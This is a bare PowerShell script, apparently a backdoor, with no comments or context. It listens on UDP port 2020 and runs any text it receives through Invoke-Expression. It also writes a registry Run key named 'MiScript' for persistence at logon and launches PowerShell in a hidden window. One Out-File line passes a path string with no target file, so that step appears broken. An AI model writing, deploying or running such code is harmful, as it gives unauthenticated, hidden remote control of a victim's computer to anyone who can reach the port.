$port = 2020
$endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $port)
$udpclient = New-Object System.Net.Sockets.UdpClient $port
$content = $udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content) | Invoke-Expression
$udpclient.Dispose()
$env:HOMEDRIVE + "\Users\" + "$env:USERNAME\script.ps1" | Out-File -Force
$rutaScript = $env:HOMEDRIVE + "\Users\" + "$env:USERNAME\script.ps1"
$nombreEntrada = "MiScript"
$valorEntrada = "powershell.exe -File $rutaScript"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $nombreEntrada -Value $valorEntrada
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File $rutaScript" -NoNewWindow -PassThru


